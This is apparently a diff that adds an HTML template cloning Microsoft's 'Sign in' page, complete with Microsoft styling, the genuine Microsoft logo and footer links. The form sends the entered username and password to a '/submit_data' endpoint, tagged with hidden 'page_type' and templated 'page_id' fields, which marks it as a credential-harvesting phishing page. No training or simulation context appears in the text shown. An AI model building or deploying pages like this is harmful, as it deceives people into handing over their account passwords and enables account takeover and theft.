@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ms-blue: #0067b8;
+            --ms-blue-hover: #005da6;
+            --ms-black: #000000;
+            --ms-gray: #666666;
+            --ms-light-gray: #f2f2f2;
+            --ms-border: #e6e6e6;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", Roboto, Arial, sans-serif;
+            background-color: #fff;
+            color: var(--ms-black);
+            line-height: 1.5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px;
+        }
+        
+        .login-container {
+            max-width: 440px;
+            width: 100%;
+            padding: 44px;
+        }
+        
+        .microsoft-logo {
+            width: 108px;
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        
+        .back-button {
+            display: none;
+            align-items: center;
+            color: var(--ms-blue);
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 16px;
+        }
+        
+        .back-button svg {
+            width: 24px;
+            height: 24px;
+            margin-right: 4px;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 600;
+            line-height: 1.25;
+            margin-bottom: 16px;
+        }
+        
+        .login-subtitle {
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 6px 10px;
+            font-size: 15px;
+            line-height: 20px;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            height: 36px;
+            outline: none;
+        }
+        
+        .form-control:focus {
+            border-color: var(--ms-blue);
+            box-shadow: 0 0 0 1px var(--ms-blue);
+        }
+        
+        .form-error {
+            display: none;
+            color: #e81123;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+        
+        .form-link {
+            color: var(--ms-blue);
+            font-size: 13px;
+            text-decoration: none;
+        }
+        
+        .form-link:hover {
+            color: var(--ms-blue-hover);
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            float: right;
+            min-width: 108px;
+            padding: 4px 12px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            background-color: var(--ms-blue);
+            border: none;
+            height: 32px;
+            cursor: pointer;
+        }
+        
+        .next-button:hover {
+            background-color: var(--ms-blue-hover);
+        }
+        
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 28px;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: flex-end;
+            gap: 24px;
+        }
+        
+        .footer-link {
+            color: var(--ms-gray);
+            font-size: 12px;
+            text-decoration: none;
+        }
+        
+        .footer-link:hover {
+            color: var(--ms-black);
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 600px) {
+            .login-container {
+                padding: 24px;
+            }
+            
+            .back-button {
+                display: flex;
+            }
+            
+            .footer {
+                padding: 16px;
+            }
+            
+            .footer-links {
+                flex-wrap: wrap;
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <a href="#" class="back-button">
+            <svg viewBox="0 0 24 24">
+                <path fill="currentColor" d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
+            </svg>
+            Back
+        </a>
+        
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="microsoft-logo">
+        
+        <div id="login-form">
+            <h1 class="login-title">Sign in</h1>
+            <p class="login-subtitle">to continue to Microsoft</p>
+            
+            <form method="POST" action="/submit_data">
+                <input type="hidden" name="page_type" value="microsoft">
+                <input type="hidden" name="page_id" value="{{ page_id }}">
+                
+                <div class="form-group">
+                    <input type="text" class="form-control" id="username" name="username" placeholder="Email, phone, or Skype" required>
+                    <div class="form-error">Enter a valid email address, phone number or Skype name.</div>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
+                    <div class="form-error">Please enter your password.</div>
+                </div>
+                
+                <div class="form-links">
+                    <a href="#" class="form-link">Forgot password?</a>
+                    <a href="#" class="form-link">Sign in with Windows Hello or a security key</a>
+                </div>
+                
+                <button type="submit" class="next-button">Sign in</button>
+            </form>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Terms of use</a>
+            <a href="#" class="footer-link">Privacy & cookies</a>
+            <a href="#" class="footer-link">...</a>
+        </div>
+    </footer>
+</body>
+</html> 
